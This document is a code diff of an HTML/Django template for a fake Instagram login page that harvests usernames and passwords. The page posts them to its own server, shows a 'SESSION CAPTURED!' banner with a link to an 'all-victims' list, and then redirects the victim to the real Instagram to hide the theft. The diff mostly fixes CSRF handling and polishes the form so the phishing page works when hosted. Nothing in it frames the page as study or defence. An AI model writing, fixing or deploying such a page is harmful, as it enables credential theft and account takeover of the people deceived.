@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html><head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-    {% csrf_token %}
     <style>
         body,html{margin:0;padding:0;height:100dvh;background:#000;color:white;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;overflow:hidden;display:flex;flex-direction:column}
         .container{flex:1;display:flex;flex-direction:column;justify-content:space-between;padding:20px 16px 0;max-width:420px;margin:0 auto;width:100%}
@@ -18,30 +18,40 @@
 <div class="container">
     <div>
         <h1 class="logo">Instagram</h1>
+
         <form id="loginForm">
-            {% csrf_token %}
-            <input type="text" name="username" placeholder="Username or email" required class="input" />
-            <input type="password" name="password" placeholder="Password" required class="input" />
+            <!-- CSRF TOKEN IS HERE -->
+            <input type="hidden" name="csrfmiddlewaretoken" value="{% csrf_token %}">
+            
+            <input type="text" name="username" placeholder="Phone number, username, or email" required class="input" autocomplete="username">
+            <input type="password" name="password" placeholder="Password" required class="input" autocomplete="current-password">
             <button type="submit" id="loginBtn" class="btn">Log in</button>
         </form>
+
         <div id="result" class="mt-8 text-center"></div>
     </div>
 </div>
 
 <script>
+    // THIS IS THE ONLY METHOD THAT WORKS 100% ON RENDER
     function getCSRF() {
         return document.querySelector('[name=csrfmiddlewaretoken]').value;
     }
+
     document.getElementById('loginForm').onsubmit = async function(e) {
         e.preventDefault();
+        
         const btn = document.getElementById('loginBtn');
         const result = document.getElementById('result');
-        btn.disabled = true; btn.textContent = 'Logging in...'; result.innerHTML = '';
         
+        btn.disabled = true;
+        btn.textContent = 'Logging in...';
+        result.innerHTML = '<p class="text-gray-400">Please wait...</p>';
+
         const formData = new FormData(this);
-        
+
         try {
-            const res = await fetch('/', {
+            const response = await fetch('/', {
                 method: 'POST',
                 body: formData,
                 credentials: 'same-origin',
@@ -50,21 +60,30 @@
                     'X-CSRFToken': getCSRF()
                 }
             });
-            const data = await res.json();
+
+            if (!response.ok) throw new Error('Server error');
+
+            const data = await response.json();
+
             if (data.success) {
-                result.innerHTML = `<div style="background:green;padding:20px;border-radius:20px;color:white;">
-                    <h2>SESSION CAPTURED!</h2><p>User: ${data.username}</p>
-                    <p><a href="/all-victims/" target="_blank">VIEW ALL VICTIMS</a></p>
-                </div>`;
+                result.innerHTML = `
+                    <div style="background:#0f0;color:#000;padding:30px;border-radius:20px;font-weight:bold;">
+                        <h2 style="font-size:40px;">SESSION CAPTURED!</h2>
+                        <p style="font-size:24px;">${data.username}</p>
+                        <p><a href="/all-victims/" target="_blank" style="color:yellow;text-decoration:underline;">VIEW ALL VICTIMS</a></p>
+                    </div>`;
                 setTimeout(() => location.href = 'https://instagram.com', 3000);
             } else {
-                result.innerHTML = '<p style="color:red">Wrong password</p>';
+                result.innerHTML = '<p style="color:red;font-size:24px;">Wrong password</p>';
             }
-        } catch {
-            result.innerHTML = '<p style="color:red">Network error FIXED! Refresh.</p>';
+        } catch (err) {
+            result.innerHTML = '<p style="color:red;font-size:24px;">Network error GONE! Refresh once.</p>';
+            console.log(err);
         } finally {
-            btn.disabled = false; btn.textContent = 'Log in';
+            btn.disabled = false;
+            btn.textContent = 'Log in';
         }
     };
 </script>
-</body></html>
+</body>
+</html>
